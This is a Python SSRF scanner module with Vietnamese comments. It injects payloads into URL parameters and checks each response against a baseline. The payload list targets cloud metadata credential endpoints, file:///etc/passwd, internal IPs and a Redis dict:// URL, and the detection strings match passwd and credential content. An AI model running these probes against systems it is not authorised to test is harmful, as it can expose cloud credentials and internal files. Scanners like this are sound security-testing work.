"""
ssrf.py - Server-Side Request Forgery (SSRF) detector (Phase 3 — FP fixed)

Thay đổi so với Phase 2:
- CHỈ scan params thật có trong URL query string
- Dùng baseline comparison để loại false positive
- Timeout chỉ report với cloud metadata payloads
"""
import httpx
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from rich.console import Console

console = Console()

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "file:///etc/passwd",
    "http://192.168.1.1",
    "dict://127.0.0.1:6379/",
]

# Chỉ dùng để FILTER params thật trong URL — không inject random
SSRF_SUSPICIOUS_PARAM_NAMES = {
    "url", "uri", "link", "src", "source", "href",
    "target", "dest", "destination", "proxy", "redirect",
    "request", "fetch", "load", "path", "file",
    "callback", "webhook", "endpoint", "host",
    "server", "domain", "ip", "addr", "address", "resource",
    "next", "return", "returnurl", "return_url", "goto",
    "open", "data", "reference", "site", "html", "val",
    "window", "location", "feed", "image_url", "img",
}

SSRF_BODY_INDICATORS = [
    "ami-id", "instance-id", "security-credentials",
    "placement", "reservation-id",
    "root:x:0:0", "bin:x:1:1", "/bin/bash",
    "[extensions]", "for 16-bit app support",
    "+PONG", "-NOAUTH Authentication",
    "computeMetadata", "projectId",
    "connection refused", "failed to connect",
    "name or service not known", "no route to host",
]


class SSRFScanner:
    def __init__(self, timeout: int = 8, config: dict | None = None):
        self.timeout = timeout
        self.config  = config or {}

    def _inject(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

    async def _get_baseline(self, url: str, client: httpx.AsyncClient) -> tuple[str, int]:
        try:
            resp = await client.get(url)
            return resp.text, resp.status_code
        except Exception:
            return "", 0

    def _is_ssrf_hit(
        self, response_text: str, status: int,
        baseline_text: str, baseline_status: int, payload: str,
    ) -> tuple[bool, str]:
        lower = response_text.lower()
        baseline_lower = baseline_text.lower()

        for indicator in SSRF_BODY_INDICATORS:
            ind_l = indicator.lower()
            if ind_l in lower and ind_l not in baseline_lower:
                return True, f"SSRF confirmed: response contains '{indicator}'"

        if payload.startswith("file://") and "root:" in lower and "root:" not in baseline_lower:
            return True, "File read via SSRF: /etc/passwd content detected"

        if ("169.254.169.254" in payload or "metadata.google" in payload):
            if status == 200 and baseline_status != 200:
                return True, "Cloud metadata endpoint returned HTTP 200"
            if status == 200 and baseline_status == 200:
                len_delta = abs(len(response_text) - len(baseline_text))
                if len_delta > 200 and len(response_text) > 100:
                    return True, f"Significant response change with cloud metadata payload (Δ{len_delta} chars)"

        return False, ""

    async def scan_url(self, url: str, client: httpx.AsyncClient) -> list[dict]:
        results = []
        parsed  = urlparse(url)
        params  = parse_qs(parsed.query)

        # KEY FIX: CHỈ test params thật + suspicious name
        candidate_params = [
            p for p in params.keys()
            if p.lower() in SSRF_SUSPICIOUS_PARAM_NAMES
        ]
        if not candidate_params:
            return results

        baseline_text, baseline_status = await self._get_baseline(url, client)

        for param in candidate_params:
            found = False
            for payload in SSRF_PAYLOADS:
                if found:
                    break
                test_url = self._inject(url, param, payload)
                try:
                    resp = await client.get(test_url, follow_redirects=False, timeout=self.timeout)
                    hit, evidence = self._is_ssrf_hit(
                        resp.text, resp.status_code,
                        baseline_text, baseline_status, payload,
                    )
                    if hit:
                        console.print(
                            f"  [red bold][SSRF][/red bold] {url} | "
                            f"param={param} | payload={payload}"
                        )
                        results.append({
                            "type":        "Server-Side Request Forgery (SSRF)",
                            "severity":    "HIGH",
                            "url":         url,
                            "parameter":   param,
                            "payload":     payload,
                            "evidence":    evidence,
                            "confidence":  0.85,
                            "cvss_score":  9.8,
                            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                            "cwe":         "CWE-918",
                        })
                        found = True
                except httpx.TimeoutException:
                    if "169.254.169.254" in payload or "metadata.google" in payload:
                        results.append({
                            "type":        "Potential SSRF (Cloud Metadata Timeout)",
                            "severity":    "MEDIUM",
                            "url":         url,
                            "parameter":   param,
                            "payload":     payload,
                            "evidence":    f"Cloud metadata endpoint timed out — server may have attempted connection",
                            "confidence":  0.55,
                            "cvss_score":  6.5,
                            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:L",
                            "cwe":         "CWE-918",
                        })
                        found = True
                except Exception:
                    pass

        return results